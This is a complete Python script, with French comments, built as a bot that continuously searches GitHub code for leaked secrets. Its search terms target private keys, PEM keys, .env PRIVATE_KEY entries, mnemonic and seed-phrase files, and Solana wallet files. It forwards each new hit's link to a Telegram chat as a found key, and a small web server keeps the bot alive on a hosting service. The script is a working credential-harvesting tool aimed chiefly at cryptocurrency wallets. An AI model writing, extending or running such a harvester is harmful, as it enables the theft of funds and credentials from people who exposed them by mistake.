import requests
import time
import os
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler

# Les variables sont lues depuis Render (pas écrites ici)
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except Exception as e:
        print("Erreur envoi:", e)

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running")

def keep_alive():
    HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()

def scan_github():
    url = "https://api.github.com/search/code"
    dorks = [
        '"private_key" extension:json',
        '"mnemonic" extension:txt',
        '"seed phrase" extension:md',
        '"BEGIN PRIVATE KEY" extension:pem',
        'path:.env "PRIVATE_KEY"',
        'path:.config/solana/id.json'
    ]
    headers = {"Authorization": f"token {os.getenv('GITHUB_TOKEN')}"}
    found = []
    for dork in dorks:
        try:
            r = requests.get(url, headers=headers, params={"q": dork, "per_page": 5}, timeout=10)
            if r.status_code == 200:
                for item in r.json().get("items", []):
                    found.append(item["html_url"])
        except:
            pass
        time.sleep(1)
    return found

def main_loop():
    seen = set()
    while True:
        try:
            results = scan_github()
            for link in results:
                if link not in seen:
                    seen.add(link)
                    send_telegram(f"🔑 Clé trouvée :\n{link}")
            time.sleep(300)
        except Exception as e:
            print("Erreur:", e)
            time.sleep(60)

if __name__ == "__main__":
    send_telegram("✅ Bot actif – scan GitHub propre")
    Thread(target=keep_alive).start()
    main_loop()
